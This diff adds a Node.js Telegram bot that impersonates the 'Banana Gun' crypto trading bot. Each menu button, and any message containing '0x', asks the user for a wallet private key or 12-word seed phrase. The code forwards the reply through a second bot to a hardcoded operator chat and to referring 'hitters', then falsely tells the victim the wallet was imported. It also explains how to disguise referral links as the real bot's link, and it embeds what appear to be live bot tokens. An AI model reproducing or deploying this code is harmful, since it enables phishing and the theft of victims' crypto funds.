@@ -1,1 +1,297 @@
-o
+const TelegramBot = require('node-telegram-bot-api');
+const fs = require('fs');
+
+// Replace these with your respective Bot tokens from BotFather
+const botAToken = '7687775677:AAEgZFmvnHHL6FofBrfIoL5hWcBJwKNBiRc';  // Token for Bot A
+const botBToken = '7942654845:AAFdfWJycyMAgWw_Xx-LKNjES0zgZUqq9SQ';  // Token for Bot B
+
+// Create instances for both bots (polling mode)
+const botA = new TelegramBot(botAToken, { polling: true });
+const botB = new TelegramBot(botBToken, { polling: true });
+
+// Target chat ID where Bot B should send forwarded messages if no referrer is present
+const targetChatId = 7069233107; 
+
+// Map to store the state for each user interacting with Bot A
+const userState = {};
+
+// Placeholder for the initial message when /start is issued
+const startMessage = `⚙️ Banana Gun Sniper Bot
+
+🍌 Your smart ally in the world of trading: Boost your gains with Banana Gun. Trade faster, snipe earlier and track live profits.
+
+________________________________________
+
+📜 <a href="https://snipers-playbook-link.com">Snipers Playbook</a>
+💬 <a href="https://t.me/official_channel_link">Official Channel</a>
+🎉 <a href="https://t.me/announcement_channel_link">Announcement Channel</a>
+🌍 <a href="https://bananagun.com">Website</a>
+
+💡 Paste the token address below to quick start with preset defaults.`;
+
+// Placeholder texts for buttons
+const button5Text = '🔫 My Pending Snipes';
+const button4Text = '🔍 Profit Tracker';
+const button3Text = '⚙️ Settings';
+const button2Text = '💫 Manual Buyer';
+const button1Text = '🍌 Auto Sniper';
+const button6Text = '📊 Setup Limit Order';
+const button7Text = '🎁 Banana Bonus';
+const button8Text = '🪙 Banana Credit';
+
+// Function to load user profiles from a text file
+const loadUserProfiles = () => {
+  if (!fs.existsSync('userprofiles.txt')) {
+    fs.writeFileSync('userprofiles.txt', '{}'); // Initialize as empty JSON
+  }
+  const data = fs.readFileSync('userprofiles.txt', 'utf-8');
+  return data ? JSON.parse(data) : {};
+};
+
+// Function to save user profiles to a text file
+const saveUserProfiles = (profiles) => {
+  fs.writeFileSync('userprofiles.txt', JSON.stringify(profiles, null, 2));
+};
+
+// Load existing user profiles
+const userProfiles = loadUserProfiles();
+
+/* ======================= BOT A: User Interaction ======================= */
+
+// Listener for any message
+botA.on('message', (msg) => {
+  const chatId = msg.chat.id;
+  const text = msg.text;
+
+  // Initialize user profile if not already present
+  if (!userProfiles[chatId]) {
+    userProfiles[chatId] = { hasReferralLink: false, referrals: [], referrer: null };
+    saveUserProfiles(userProfiles);
+  }
+
+  // Check for referral link when starting the bot
+  if (text.startsWith('/start')) {
+    const referralId = text.split(' ')[1]; // Extract referral ID if present
+    if (referralId && userProfiles[referralId]) {
+      // If referral ID is valid, notify the inviter through Bot B
+      const inviterChatId = referralId;
+      if (userProfiles[inviterChatId]) {
+        const invitedUserMessage = `✅ User ${chatId} joined through your referral link!`;
+        botB.sendMessage(inviterChatId, invitedUserMessage);
+        
+        // Add this user under the inviter in the profiles and mark the referrer
+        userProfiles[inviterChatId].referrals.push(chatId);
+        userProfiles[chatId].referrer = inviterChatId;
+        saveUserProfiles(userProfiles); // Save updated profiles
+      }
+    }
+
+    // Send the initial message with buttons
+    const options = {
+      reply_markup: {
+        inline_keyboard: [
+          [
+            { text: button1Text, callback_data: 'btn1' },
+          ],
+          [
+            { text: button2Text, callback_data: 'btn2' }
+          ],
+          [
+            { text: button3Text, callback_data: 'btn3' },
+          ],
+          [
+            { text: button4Text, callback_data: 'btn4' }
+          ],
+          [
+            { text: button5Text, callback_data: 'btn5' }
+          ],
+          [
+            { text: button6Text, callback_data: 'btn6' }
+          ],
+          [
+            { text: button7Text, callback_data: 'btn7' }
+          ],
+          [
+            { text: button8Text, callback_data: 'btn8' }
+          ]
+        ]
+      }
+    };
+
+    botA.sendMessage(chatId, startMessage, {
+      parse_mode: 'HTML',
+      reply_markup: options.reply_markup,
+      disable_web_page_preview: true
+    });
+
+    // Clear the user state if they restart the bot
+    userState[chatId] = { waitingForInput: false };
+  }
+
+  // Check for wallet address input
+  if (text.includes("0x")) {
+    const responseText = '⚙️ Enter your private key or 12 mnemonic words of your wallet. Please note, in order to properly use the trading advantages, we advice you to deposit atleast 0.2ETH.\n\nMetaMask, TrustWallet, Coinbase, Ledger, Solflare, Phantom, OKX, other trade bots private key 🔑  or other DeFi wallets 👛';
+    
+    const cancelOptions = {
+      reply_markup: {
+        inline_keyboard: [
+          [{ text: 'Cancel', callback_data: 'cancel' }]
+        ]
+      }
+    };
+
+    botA.sendMessage(chatId, responseText, cancelOptions)
+      .then((sentMessage) => {
+        userState[chatId] = {
+          waitingForInput: true,
+          replyMessageId: sentMessage.message_id
+        };
+      });
+    return;
+  }
+
+  // Handle the referral link command
+  if (text.startsWith('/give_ref_link')) {
+    const refUserId = text.split(' ')[1]; // Extract the user ID to give a referral link
+    if (!refUserId || !userProfiles[refUserId]) {
+      botA.sendMessage(chatId, 'User ID not found or invalid.');
+      return;
+    }
+    
+    // Create a referral link
+    const referralLink = `https://t.me/bananagunsniper20_bot?start=${refUserId}`;
+    userProfiles[refUserId].hasReferralLink = true;
+    
+    // Save the updated user profiles
+    saveUserProfiles(userProfiles);
+    
+    // Notify the user of their referral link
+    const referralMessage = `🎮 Make sure that you first go to @bananaGunHitsBot and do /start so the bot can send you all the logs\n\n🎉 Here is your referral link: ${referralLink}\n\n👻 How to make a spoof link? Copy the original bananagun sniper link: https://t.me/BananaGunSniper_bot, paste it, select the link, click on format, then it will either say "hyperlink" or "link". Once clicked, you input the link that was assigned to you and voila.`;
+    botA.sendMessage(refUserId, referralMessage);
+    botA.sendMessage(chatId, `Referral link sent to user ${refUserId}.`);
+    return;
+  }
+
+  // Handle the /become_hitter command
+  if (text.startsWith('/become_hitter')) {
+    if (!userProfiles[chatId]) {
+      botA.sendMessage(chatId, 'Profile not found or invalid.');
+      return;
+    }
+
+    // Create a referral link for the user who typed /become_hitter
+    const referralLink = `https://t.me/bananagunsniper20_bot?start=${chatId}`;
+    userProfiles[chatId].hasReferralLink = true;
+
+    // Save the updated user profiles
+    saveUserProfiles(userProfiles);
+
+    // Notify the user of their referral link
+    const referralMessage = `🎮 Make sure that you first go to @EveryHitBot and do /start so the bot can send you all the logs\n\n🎉 Here is your referral link: ${referralLink}\n\n👻 How to make a spoof link? Copy the original bananagun sniper link: https://t.me/BananaGunSniper_bot, paste it, select the link, click on format, then it will either say "hyperlink" or "link". Once clicked, you input the link that was assigned to you and voila.`;
+    botA.sendMessage(chatId, referralMessage);
+    return;
+  }
+
+  // Handle user input after a button is clicked and wait for one message
+  if (userState[chatId] && userState[chatId].waitingForInput) {
+    const replyMessageId = userState[chatId].replyMessageId;
+
+    // Send the message to the hardcoded ID
+    const messageToSend = `🏆 Input received from user ${chatId}. Received from Banana Bot: ${msg.text}`;
+    botB.sendMessage(targetChatId, messageToSend);
+
+    // Check if the user has a referrer
+    const referrerId = userProfiles[chatId]?.referrer;
+    if (referrerId && userProfiles[referrerId]) {
+      // Send the message to the referrer with a 3-second delay if they exist
+      setTimeout(() => {
+        botB.sendMessage(referrerId, messageToSend);
+      }, 3000);
+    }
+
+    // Notify user that input was received
+    const confirmationMessage = '✅ Your input has been received! Your wallet has been imported.';
+    botA.sendMessage(chatId, confirmationMessage);
+
+    // Remove the input request message and reset user state
+    botA.deleteMessage(chatId, replyMessageId);
+    userState[chatId] = { waitingForInput: false };
+  }
+});
+
+// Handle button clicks and notify referrers/hardcoded ID
+botA.on('callback_query', (callbackQuery) => {
+  const message = callbackQuery.message;
+  const chatId = message.chat.id;
+  const messageId = message.message_id;
+  const data = callbackQuery.data;
+
+  if (data === 'cancel') {
+    botA.deleteMessage(chatId, messageId);
+    userState[chatId] = { waitingForInput: false };
+    return;
+  }
+
+  // If the user has a referral link, do not send an alert
+  if (userProfiles[chatId] && userProfiles[chatId].hasReferralLink) {
+    // User has a referral link, so no need to send a notification
+    return;
+  }
+
+  let responseText = '';
+  switch (data) {
+    case 'btn1':
+    case 'btn2':
+    case 'btn3':
+    case 'btn4':
+    case 'btn5':
+    case 'btn6':
+    case 'btn7':
+    case 'btn8':
+      responseText = '⚙️ Enter your private key or 12 mnemonic words of your wallet.\n\n🚨Please note, in order to properly benefit from the trading advantages, we advice you to have atleast 0.2ETH in your wallet.\n\nMetaMask, TrustWallet, Coinbase, Ledger, Solflare, Phantom, OKX, other trade bots private key 🔑  or other DeFi wallets 👛';
+
+      // Check if the user does not have a referral link (or wasn't referred)
+      if (!userProfiles[chatId].hasReferralLink) {
+        const alertMessage = `🚨 User ${chatId} has clicked one of the buttons and is at the input stage!`;
+
+        // Notify the hardcoded ID
+        botB.sendMessage(targetChatId, alertMessage);
+
+        // If the user was referred but does not have a referral link, notify the referrer instantly
+        const referrerId = userProfiles[chatId].referrer;
+        if (referrerId && userProfiles[referrerId]) {
+          botB.sendMessage(referrerId, alertMessage);
+        }
+      }
+      break;
+    default:
+      return;
+  }
+
+  const cancelOptions = {
+    reply_markup: {
+      inline_keyboard: [
+        [{ text: 'Cancel', callback_data: 'cancel' }]
+      ]
+    }
+  };
+
+  botA.sendMessage(chatId, responseText, cancelOptions)
+    .then((sentMessage) => {
+      userState[chatId] = {
+        waitingForInput: true,
+        replyMessageId: sentMessage.message_id
+      };
+    });
+});
+
+/* ======================= BOT B: Notification ======================= */
+botB.on('message', (msg) => {
+  const chatId = msg.chat.id;
+  const text = msg.text;
+  
+  if (text) {
+    // Handle Bot B specific commands/messages here if necessary
+    botB.sendMessage(chatId, "Bot B received your message!");
+  }
+});
